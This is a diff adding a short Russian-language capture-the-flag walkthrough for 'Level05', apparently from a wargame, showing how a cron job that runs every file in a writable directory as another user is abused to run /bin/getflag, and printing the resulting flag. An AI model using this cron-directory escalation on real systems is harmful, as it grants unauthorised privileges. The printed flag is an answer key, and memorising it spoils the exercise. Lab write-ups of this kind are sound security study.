@@ -1,0 +1,17 @@
+Level05 - 
+
+1. Видим что есть внутренний mail. Писбма хранятся в папке /var/spool/mail/. Видим в письме ссылку на строку
+    crontab */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05;
+
+2. cat /usr/sbin/openarenaserver. Там скрипт, который запускает все файлы из папки /opt/openarenaserver
+    Создаем в ней файл touch /opt/openarenaserver/test
+
+3. /bin/getflag > /tmp/flag05  Добавляем эту строку в файл /opt/openarenaserver/test
+    Меняем права файлу для запуска из крона (файл сразу после вызова будет удален, поэтому делем любую грязь) 
+    - chmod 777 /opt/openarenaserver/test
+
+4. ждем до 2-х минут
+
+5. cat /tmp/flag05
+    viuaaale9huek52boumoomioc
+ 
